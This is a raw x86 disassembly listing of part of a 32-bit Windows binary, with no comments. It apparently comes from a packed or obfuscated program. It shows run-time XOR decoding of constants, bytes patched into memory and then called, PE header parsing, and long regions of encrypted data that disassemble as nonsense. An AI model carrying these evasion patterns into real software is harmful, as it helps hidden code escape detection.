  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x4306d6,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42efb0,0x4306d2
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ef90,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x430622,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x4306ce,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x430632,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x430636,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0x37dbaabd,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a24a
  40a236:	aad    0x9b
  40a238:	push   esi
  40a239:	push   edx
  40a23a:	jmp    0x40a26f
  40a23c:	push   ebx
  40a23d:	cmp    edi,DWORD PTR [ebx]
  40a23f:	out    0x10,eax
  40a241:	pop    eax
  40a242:	pop    esp
  40a243:	mov    cl,dh
  40a245:	aaa    
  40a246:	add    DWORD PTR [edx+0x1f],0xb9d78dc0
  40a24d:	lea    ebx,[ebx]
  40a24f:	sar    ebp,1
  40a251:	xor    esp,ebp
  40a253:	(bad)  
  40a254:	aaa    
  40a255:	rcl    ah,cl
  40a257:	push   edi
  40a258:	aas    
  40a259:	fcmovne st,st(6)
  40a25b:	es pop ebp
  40a25d:	push   es
  40a25e:	dec    eax
  40a25f:	pop    ecx
  40a260:	pop    ecx
  40a261:	jg     0x40a206
  40a263:	repz add eax,0xa0ac02c8
  40a269:	fwait
  40a26a:	sub    al,0x3e
  40a26c:	xor    al,BYTE PTR [eax]
  40a26e:	pop    esp
  40a26f:	jp     0x40a2ca
  40a271:	pop    edi
  40a272:	out    dx,al
  40a273:	pushf  
  40a274:	sahf   
  40a275:	mov    BYTE PTR [eax-0x163f1583],cl
  40a27b:	inc    ebp
  40a27c:	add    dh,BYTE PTR [esi]
  40a27e:	out    dx,eax
  40a27f:	push   es
  40a280:	jo     0x40a21e
  40a282:	cmp    bl,0x6
  40a285:	rcr    DWORD PTR [edx+0x41e503d1],cl
  40a28b:	sar    BYTE PTR [esi-0x2d],1
  40a28e:	daa    
  40a28f:	aaa    
  40a290:	xor    eax,0x4a223a91
  40a295:	dec    esi
  40a296:	bound  ebp,QWORD PTR [edx]
  40a298:	mov    edx,0x949abc45
  40a29d:	hlt    
  40a29e:	sbb    BYTE PTR [edx-0x80fa5b1],al
  40a2a4:	aaa    
  40a2a5:	(bad)  
  40a2a6:	mov    ch,0x35
  40a2a8:	test   eax,0x73f4f38c
  40a2ad:	cdq    
  40a2ae:	das    
  40a2af:	jb     0x40a28c
  40a2b1:	adc    eax,0x52e2307
  40a2b6:	sub    ch,dh
  40a2b8:	mov    edx,0x995fa55f
  40a2bd:	ficomp DWORD PTR [ecx+0x46bf02a9]
  40a2c3:	aad    0xd6
  40a2c5:	xchg   edi,eax
  40a2c6:	mov    eax,0x1701b92d
  40a2cb:	cmp    eax,0x63477a41
  40a2d0:	in     eax,dx
  40a2d1:	dec    ebx
  40a2d2:	cmp    ch,ah
  40a2d4:	test   ebx,ebp
  40a2d6:	mov    ch,BYTE PTR [edx]
  40a2d8:	lahf   
  40a2d9:	mov    ah,0x57
  40a2db:	into   
  40a2dc:	jmp    0x40a2e9
  40a2de:	scas   eax,DWORD PTR es:[edi]
  40a2df:	aaa    
  40a2e0:	lods   al,BYTE PTR fs:[esi]
  40a2e2:	loope  0x40a2c0
  40a2e4:	int    0xb0
  40a2e6:	shr    edi,1
  40a2e8:	lock mov edx,ds
  40a2eb:	iret   
  40a2ec:	leave  
  40a2ed:	jl     0x40a31c
  40a2ef:	fbstp  TBYTE PTR [ebx+0x2e7bdc78]
  40a2f5:	jno    0x40a307
  40a2f7:	mov    dl,0x95
  40a2f9:	push   ebx
  40a2fa:	data16 aas 
  40a2fc:	ret    0x3a47
  40a2ff:	clc    
  40a300:	inc    esi
  40a301:	mov    eax,0x9178b4cd
  40a306:	imul   BYTE PTR [edi]
  40a308:	jo     0x40a335
  40a30a:	mov    DWORD PTR [esi],edi
  40a30c:	xchg   ebp,eax
  40a30d:	mov    dl,0xe0
  40a30f:	cmp    BYTE PTR [ebp-0x6dc4837f],al
  40a315:	xor    edx,ebx
  40a317:	dec    ebp
  40a318:	mov    DWORD PTR [ecx+edi*4],ebx
  40a31b:	ret    0x3234
  40a31e:	es loop 0x40a2be
  40a321:	mov    al,0x5d
  40a323:	data16 sbb cl,BYTE PTR [ecx-0x45]
  40a327:	cmp    eax,0x656c2511
  40a32c:	inc    edx
  40a32d:	mov    eax,ds:0xb0003845
  40a332:	jne    0x40a2fd
  40a334:	gs out 0x5f,eax
  40a337:	sbb    dl,cl
  40a339:	fmul   DWORD PTR [ebx-0x52cb97f]
  40a33f:	inc    ebp
  40a340:	sahf   
  40a341:	dec    eax
  40a342:	sbb    BYTE PTR [edi+0x21a63e44],ah
  40a348:	adc    al,0x42
  40a34a:	out    0x41,eax
  40a34c:	dec    ecx
  40a34d:	mov    esp,0x130ee765
  40a352:	inc    DWORD PTR [ecx+0xf]
  40a355:	add    ebx,DWORD PTR [edi-0x1e2807db]
  40a35b:	xchg   esi,eax
  40a35c:	fstp   QWORD PTR [ebx]
  40a35e:	loope  0x40a33f
  40a360:	pop    ecx
  40a361:	jmp    0x40a35a
  40a363:	loope  0x40a3ce
  40a365:	(bad)  
  40a366:	pop    eax
  40a367:	jbe    0x40a3d9
  40a369:	push   0x54abe104
  40a36e:	pop    ebp
  40a36f:	in     al,dx
  40a370:	and    eax,0xbfd48176
  40a375:	xchg   edx,ebx
  40a377:	test   BYTE PTR [edi+0xc5d2e9],0x90
  40a37e:	dec    eax
  40a37f:	js     0x40a3a8
  40a381:	xor    bl,dh
  40a383:	rcr    ebx,cl
  40a385:	or     al,0x19
  40a387:	out    dx,eax
  40a388:	sbb    eax,0xd79f95e3
  40a38d:	xchg   ebx,eax
  40a38e:	repnz mov DWORD PTR ds:0x1077e96d,0xd83b2a7
  40a399:	adc    dl,al
  40a39b:	adc    ch,BYTE PTR [edi+0x6a]
  40a39e:	dec    esp
  40a39f:	xor    BYTE PTR [ebp+edi*4-0x4d],bh
  40a3a3:	inc    esp
  40a3a4:	mov    dh,0x3c
  40a3a6:	shl    DWORD PTR ds:0xcc63739f,cl
  40a3ac:	mov    ds:0xdd41e21f,al
  40a3b1:	stc    
  40a3b2:	inc    ebp
  40a3b3:	out    dx,al
  40a3b4:	enter  0x40d5,0x41
  40a3b8:	sub    al,0x68
  40a3ba:	xchg   esp,eax
  40a3bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3bc:	into   
  40a3bd:	ss pop edi
  40a3bf:	and    BYTE PTR [esi],0xf9
  40a3c2:	ret    0x5ce3
  40a3c5:	dec    ebp
  40a3c6:	dec    edx
  40a3c7:	mov    edx,0x2e4b6093
  40a3cc:	or     al,0x4a
  40a3ce:	push   es
  40a3cf:	lods   al,BYTE PTR ds:[esi]
  40a3d0:	xchg   DWORD PTR [esi],eax
  40a3d2:	les    esi,FWORD PTR [esp+eiz*8+0x3c]
  40a3d6:	js     0x40a385
  40a3d8:	or     ecx,DWORD PTR [edx+0x163db477]
  40a3de:	jb     0x40a3f4
  40a3e0:	adc    DWORD PTR [esi-0x7f],esp
  40a3e3:	jle    0x40a3e4
  40a3e5:	dec    esi
  40a3e6:	inc    esp
  40a3e7:	repnz out dx,al
  40a3e9:	mov    esi,eax
  40a3eb:	xor    eax,DWORD PTR [ebp-0x6c]
  40a3ee:	retf   
  40a3ef:	mov    esp,0xfe334698
  40a3f4:	lods   al,BYTE PTR ds:[esi]
  40a3f5:	adc    eax,0xc58b9ef1
  40a3fa:	pop    esp
  40a3fb:	(bad)
  40a3fe:	mov    bh,0x8a
  40a400:	lods   al,BYTE PTR ds:[esi]
  40a401:	add    dl,BYTE PTR [ecx+0x63a3ad35]
  40a407:	dec    ebx
  40a408:	sbb    esp,edi
  40a40a:	test   BYTE PTR [esi],al
  40a40c:	retf   
  40a40d:	jnp    0x40a40a
  40a40f:	fucomp st(4)
  40a411:	inc    esp
  40a412:	xchg   ebp,eax
  40a413:	(bad)  
  40a414:	lds    edi,FWORD PTR [esi]
  40a416:	mov    eax,ds:0x30bfe818
  40a41b:	mov    bh,BYTE PTR [eax]
  40a41d:	int3   
  40a41e:	and    BYTE PTR [ecx+0x7c],cl
  40a421:	loop   0x40a452
  40a423:	xchg   DWORD PTR [edx],edx
  40a425:	inc    ebx
  40a426:	mov    ds,WORD PTR [edi-0x1c]
  40a429:	or     DWORD PTR [esi+0xf7e7c9b],0x7e
  40a430:	mov    dl,0xe7
  40a432:	cmp    DWORD PTR [esi+eiz*8-0x33],ebp
  40a436:	ss int3 
  40a438:	jno    0x40a47b
  40a43a:	mov    eax,DWORD PTR gs:[ecx]
  40a43d:	xor    BYTE PTR [edi+0x74],bl
  40a440:	gs push esp
  40a442:	mov    cl,0xa6
  40a444:	sub    al,0x1c
  40a446:	jbe    0x40a463
  40a448:	inc    edx
  40a449:	push   ebx
  40a44a:	dec    ebx
  40a44b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a44c:	fxch   st(1)
  40a44e:	jge    0x40a472
  40a450:	add    al,BYTE PTR [ecx+0x3e8c38f6]
  40a456:	test   al,0x51
  40a458:	pop    ds
  40a459:	push   ecx
  40a45a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a45b:	xor    DWORD PTR [edi+0x2455fa54],edi
  40a461:	cmp    edx,DWORD PTR [ebp+edx*2-0x5e]
  40a465:	pop    es
  40a466:	test   al,0x62
  40a468:	ds sub DWORD PTR fs:[esi-0x71f147b6],esi
  40a470:	inc    eax
  40a471:	jb     0x40a423
  40a473:	ins    DWORD PTR es:[edi],dx
  40a474:	push   es
  40a475:	mov    ecx,0x10295680
  40a47a:	pop    ds
  40a47b:	mov    ecx,esp
  40a47d:	pop    esp
  40a47e:	dec    edi
  40a47f:	xchg   ebx,eax
  40a480:	and    DWORD PTR [esp+esi*8-0x2e],eax
  40a484:	scas   al,BYTE PTR es:[edi]
  40a485:	jmp    DWORD PTR [eax-0x201f1499]
  40a48b:	mov    ebp,0xad29873f
  40a490:	mov    al,0x44
  40a492:	aas    
  40a493:	cmp    DWORD PTR ds:0x8458b8d,0xffffffc7
  40a49a:	add    eax,0x4306c2
  40a49f:	pop    ss
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    BYTE PTR [ebx+0x4306c23d],al
  40a4a8:	add    BYTE PTR [eax],al
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x4306c2,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42ec64
  40a4c6:	mov    ecx,DWORD PTR ds:0x4306c2
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x4306c2,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x15daa360
  40a537:	cld    
  40a538:	(bad)  
  40a539:	mov    ah,0xe8
  40a53b:	jle    0x40a5bb
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a555
  40a542:	test   eax,0xd02623a8
  40a547:	mov    eax,ds:0x1a717d50
  40a54c:	pop    esp
  40a54d:	jns    0x40a54d
  40a54f:	sbb    ah,BYTE PTR [ecx]
  40a551:	jecxz  0x40a58d
  40a553:	fnstenv [esi-0x71]
  40a556:	add    al,0x22
  40a558:	push   ss
  40a559:	add    edx,DWORD PTR [esi]
  40a55b:	loop   0x40a56c
  40a55d:	inc    esp
  40a55e:	cs cmp ch,0x58
  40a562:	scas   al,BYTE PTR es:[edi]
  40a563:	(bad)  
  40a566:	call   0xd9e0b917
  40a56b:	xchg   esp,eax
  40a56c:	cdq    
  40a56d:	jae    0x40a51e
  40a56f:	ja     0x40a583
  40a571:	xor    edx,esi
  40a573:	pop    esp
  40a574:	xor    BYTE PTR [edi-0xf2947e0],al
  40a57a:	test   al,0x57
  40a57c:	cmp    BYTE PTR es:[ebx+esi*1],bh
  40a580:	mov    eax,ds:0x7e35d623
  40a585:	or     al,0x34
  40a587:	inc    ecx
  40a588:	add    DWORD PTR [ecx-0x2170d0f8],ebx
  40a58e:	(bad)  
  40a58f:	fucomip st,st(5)
  40a591:	and    al,0xe0
  40a593:	stos   BYTE PTR es:[edi],al
  40a594:	pop    ebp
  40a595:	iret   
  40a596:	jbe    0x40a58a
  40a598:	mov    ds:0x714cb6a9,al
  40a59d:	ficomp WORD PTR [esi]
  40a59f:	addr16 call 0xe532:0xe71281fc
  40a5a7:	in     eax,dx
  40a5a8:	mov    dl,0x8f
  40a5aa:	in     al,dx
  40a5ab:	fild   WORD PTR ds:0xd72000e4
  40a5b1:	xchg   ecx,eax
  40a5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b3:	loop   0x40a61c
  40a5b5:	xor    DWORD PTR [ebp-0x53faae3a],eax
  40a5bb:	ins    DWORD PTR es:[edi],dx
  40a5bc:	pushf  
  40a5bd:	push   ss
  40a5be:	aad    0x48
  40a5c0:	sar    dh,cl
  40a5c2:	repnz xchg ebp,eax
  40a5c4:	sbb    ch,BYTE PTR [ecx+0x6f]
  40a5c7:	jmp    0x15b386dd
  40a5cc:	in     al,dx
  40a5cd:	sbb    ecx,DWORD PTR [ebp+ebp*1-0x58]
  40a5d1:	xlat   BYTE PTR ds:[ebx]
  40a5d2:	std    
  40a5d3:	scas   eax,DWORD PTR es:[di]
  40a5d5:	adc    ebp,ebp
  40a5d7:	xor    eax,0xb315ad8f
  40a5dc:	mov    WORD PTR [edx+edi*2-0xc40de5],?
  40a5e3:	out    0x5b,eax
  40a5e5:	popf   
  40a5e6:	and    ebp,DWORD PTR [ecx]
  40a5e8:	mov    dh,0x5f
  40a5ea:	aaa    
  40a5eb:	xor    BYTE PTR [ebx+0x167064de],0x53
  40a5f2:	outs   dx,DWORD PTR ds:[esi]
  40a5f3:	pop    es
  40a5f4:	test   al,0xe
  40a5f6:	aas    
  40a5f7:	aad    0xb8
  40a5f9:	mov    al,ds:0xb56fc591
  40a5fe:	push   es
  40a5ff:	icebp  
  40a600:	push   0xffffffb3
  40a602:	jno    0x40a617
  40a604:	aas    
  40a605:	jbe    0x40a5d9
  40a607:	xchg   ecx,eax
  40a608:	push   es
  40a609:	xchg   DWORD PTR [ebx],edi
  40a60b:	sbb    eax,0xefe03241
  40a610:	inc    edx
  40a611:	cld    
  40a612:	ins    BYTE PTR es:[edi],dx
  40a613:	(bad)  [ecx]
  40a615:	and    DWORD PTR [eax-0x7b6f35ca],0xffffffa9
  40a61c:	daa    
  40a61d:	sbb    DWORD PTR [ebp-0x5f70706],eax
  40a623:	xchg   DWORD PTR [ebx+edi*4+0x76],ebx
  40a627:	xchg   edx,eax
  40a628:	cmp    eax,0xe465a430
  40a62d:	mov    eax,ds:0x414fd76d
  40a632:	ret    0x6989
  40a635:	mov    edx,fs
  40a637:	or     DWORD PTR [ebx+0x38],edi
  40a63a:	jp     0x40a5ca
  40a63c:	and    al,0xba
  40a63e:	push   ebx
  40a63f:	sbb    eax,0xe616a49f
  40a644:	add    edi,DWORD PTR [eax-0x2a7fd07b]
  40a64a:	in     eax,dx
  40a64b:	test   al,0x2
  40a64d:	push   ss
  40a64e:	mov    bl,0xdb
  40a650:	(bad)  
  40a651:	icebp  
  40a652:	add    esi,ebp
  40a654:	rcr    BYTE PTR [edi],1
  40a656:	jo     0x40a630
  40a658:	mov    ecx,0x73e06043
  40a65d:	or     al,dh
  40a65f:	addr16 inc ebx
  40a661:	(bad)  
  40a662:	(bad)  
  40a663:	arpl   WORD PTR ss:[edx],ax
  40a666:	jns    0x40a676
  40a668:	or     bl,BYTE PTR [esi]
  40a66a:	iret   
  40a66b:	cli    
  40a66c:	add    BYTE PTR [eax],ch
  40a66e:	iret   
  40a66f:	mov    al,ds:0x747817b2
  40a674:	lods   eax,DWORD PTR ds:[esi]
  40a675:	ficom  DWORD PTR [edx+eax*2-0x6bb7dd14]
  40a67c:	loop   0x40a612
  40a67e:	ret    0x6939
  40a681:	pop    es
  40a682:	jle    0x40a682
  40a684:	ja     0x40a6f2
  40a686:	mov    esp,DWORD PTR [edi-0x32]
  40a689:	inc    edx
  40a68a:	lods   al,BYTE PTR fs:[esi]
  40a68c:	lock fs dec edx
  40a68f:	xchg   edi,eax
  40a690:	dec    ecx
  40a691:	add    dl,BYTE PTR [edi+0x3a]
  40a694:	aam    0x11
  40a696:	xchg   DWORD PTR [edi],ecx
  40a698:	xor    BYTE PTR [ebx],cl
  40a69a:	in     eax,0x73
  40a69c:	inc    edx
  40a69d:	pop    esp
  40a69e:	(bad)  
  40a6a0:	adc    BYTE PTR [eax+0x1f],bl
  40a6a3:	loop   0x40a63e
  40a6a5:	mov    bh,0x73
  40a6a7:	jg     0x40a6f4
  40a6a9:	fst    DWORD PTR [ecx-0x40]
  40a6ac:	sti    
  40a6ad:	call   0x21009591
  40a6b2:	outs   dx,BYTE PTR ds:[esi]
  40a6b3:	adc    eax,0x229fd963
  40a6b8:	xbegin 0x21d34b49
  40a6be:	push   0x2f471e1b
  40a6c3:	push   cs
  40a6c4:	push   ebx
  40a6c5:	dec    edx
  40a6c6:	shr    dl,1
  40a6c8:	xchg   DWORD PTR [edi+0x1949905],ebp
  40a6ce:	jle    0x40a66d
  40a6d0:	dec    ebp
  40a6d1:	mov    cl,0x96
  40a6d3:	dec    edx
  40a6d4:	fnsave [ebx+0x7b]
  40a6d7:	call   0xc955e5c8
  40a6dc:	cli    
  40a6dd:	dec    ebx
  40a6de:	fwait
  40a6df:	and    eax,0x7cd25d73
  40a6e4:	mov    edi,0x17908a0e
  40a6e9:	pop    edx
  40a6ea:	mov    edi,0xa68376a9
  40a6ef:	inc    edi
  40a6f0:	mov    dl,0x41
  40a6f2:	xchg   esi,eax
  40a6f3:	adc    esp,DWORD PTR [eax+eax*1-0x4f]
  40a6f7:	retf   0x3ceb
  40a6fa:	sub    ah,BYTE PTR [eax-0x2d]
  40a6fd:	pushf  
  40a6fe:	loope  0x40a6f1
  40a700:	aad    0x9a
  40a702:	fcom   DWORD PTR [ecx+ebx*1]
  40a705:	int3   
  40a706:	outs   dx,BYTE PTR ds:[esi]
  40a707:	and    esi,ecx
  40a709:	imul   ebx,esp,0xffffff94
  40a70c:	mov    bh,0x45
  40a70e:	repz addr16 push cs
  40a711:	or     dl,bl
  40a713:	leave  
  40a714:	jae    0x40a768
  40a716:	mov    BYTE PTR ds:0x118fc0dc,ah
  40a71c:	pusha  
  40a71d:	test   edx,esi
  40a71f:	jmp    0xb839f26d
  40a724:	add    ebp,DWORD PTR [edi+0x1b]
  40a727:	in     al,0xdc
  40a729:	jne    0x40a728
  40a72b:	sti    
  40a72c:	push   ecx
  40a72d:	popa   
  40a72e:	jnp    0x40a732
  40a730:	jno    0x40a6ec
  40a732:	cmc    
  40a733:	or     DWORD PTR [esp+eax*8+0x31],eax
  40a737:	popf   
  40a738:	fstp   TBYTE PTR [eax+0x6f822a38]
  40a73e:	imul   ecx,DWORD PTR [edx],0x4a
  40a741:	mov    ds:0xc2df24e,eax
  40a746:	jns    0x40a707
  40a748:	(bad)  
  40a749:	jle    0x40a6e4
  40a74b:	dec    eax
  40a74c:	fild   QWORD PTR [esi-0x80]
  40a74f:	pop    edx
  40a750:	sub    ecx,DWORD PTR [ecx+esi*2]
  40a753:	jb     0x40a77a
  40a755:	scas   al,BYTE PTR es:[edi]
  40a756:	adc    ebp,0xffffffc8
  40a759:	call   0xd6eac919
  40a75e:	push   ds
  40a75f:	jle    0x40a6e5
  40a761:	and    DWORD PTR [ecx],eax
  40a763:	out    0x96,al
  40a765:	xor    eax,0x6c70a5ed
  40a76a:	sbb    ah,cl
  40a76c:	ret    
  40a76d:	mov    ds:0xd42fa686,al
  40a772:	xor    edx,esi
  40a774:	jecxz  0x40a785
  40a776:	cmp    BYTE PTR [edi],bl
  40a778:	jecxz  0x40a778
  40a77a:	sbb    eax,0x484dfaf2
  40a77f:	xchg   esi,eax
  40a780:	inc    ebp
  40a781:	sbb    DWORD PTR [ecx-0x57ea2964],ebx
  40a787:	js     0x40a70f
  40a789:	xor    eax,0x415c3c0
  40a78e:	push   es
  40a78f:	outs   dx,DWORD PTR ds:[esi]
  40a790:	out    0x92,al
  40a792:	gs dec ebx
  40a794:	and    bl,al
  40a796:	fwait
  40a797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a798:	inc    esi
  40a799:	cmp    ah,BYTE PTR [ebx]
  40a79b:	pop    ebp
  40a79c:	pop    esi
  40a79d:	loopne 0x40a7a0
  40a79f:	and    eax,0x9d053b94
  40a7a4:	jb     0x40a7d8
  40a7a6:	add    cl,cl
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43061e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43061e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43061e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43061e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43061e,0x9
  40a7df:	jne    0x40a7f1
